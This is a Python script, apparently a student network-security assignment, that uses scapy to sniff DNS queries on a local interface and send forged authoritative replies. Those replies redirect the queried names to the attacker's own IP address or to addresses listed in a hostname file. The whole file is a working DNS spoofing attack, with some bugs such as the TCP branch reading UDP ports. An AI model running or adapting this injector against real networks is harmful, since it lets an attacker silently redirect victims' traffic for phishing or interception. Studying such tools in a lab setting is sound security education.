#Name: Sotomayor, Nygel
#UIN: 655654678
#NetID: nsotom3
import argparse
import socket
import scapy.all as scapy
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP,TCP
from scapy.sendrecv import send
from scapy.packet import *

def dns_injector(pkt):
    #print(pkt)
    udp = False
    tcp = True
    redirect_ip = ip_address
    if pkt.haslayer(TCP):
        tcp = True
    elif pkt.haslayer(UDP):
        udp = True
    if pkt.haslayer(DNSQR):
        stolenqd = pkt[DNS].qd
        stolenqname = stolenqd.qname
        stolenname = str(stolenqname)
        stolenname = stolenname[2:-2]
        #print(stolenname)
        if args.hostname is not None:
            for line in args.hostname:
                linestring = str(line)
                if stolenname in linestring:
                    #print("HERE")
                    redirect_ip = line[0]
                    print(redirect_ip)
                    print(pkt[IP].src)
                    print(pkt[IP].dst)
                    if (udp):
                        modified_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                        UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                        DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1, \
                        an=DNSRR(rrname=(pkt[DNS].qd).qname,  ttl=10, rdata=redirect_ip))
                    elif (tcp):
                        modified_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                        TCP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                        DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1, \
                        an=DNSRR(rrname=(pkt[DNS].qd).qname,  ttl=10, rdata=redirect_ip))
                    send(modified_pkt)
                    print(modified_pkt.summary())
        else:
            if (udp):
                modified_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                        UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                        DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1, \
                        an=DNSRR(rrname=(pkt[DNS].qd).qname,  ttl=10, rdata=redirect_ip))
            elif (tcp):
                modified_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                        TCP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                        DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1, \
                        an=DNSRR(rrname=(pkt[DNS].qd).qname,  ttl=10, rdata=redirect_ip))
            send(modified_pkt)
            print(modified_pkt.summary())  
def main():
    global ip_address
    global args
    parser = argparse.ArgumentParser(add_help=False)
    ip_address = socket.gethostbyname(socket.gethostname())
    #print(ip_address)
    interface = "en0"
    parser.add_argument("-i","--interface", default = interface)
    parser.add_argument("-h", "--hostname")
    args = parser.parse_args()
    #I'm assuming the format of the file is consistent here.
    #Preproccesing the data for hostname
    if (args.hostname != None):
        f = open(str(args.hostname), "r")
        lines = f.readlines()
        newlist = [string.replace("\n", "") for string in lines]
        finallist = [string.split(',') for string in newlist]
        args.hostname = finallist
    #dns_injector(args.interface,args.hostname)
    scapy.sniff(filter = '', iface = str(args.interface), prn=dns_injector)
if __name__ == "__main__":
    main()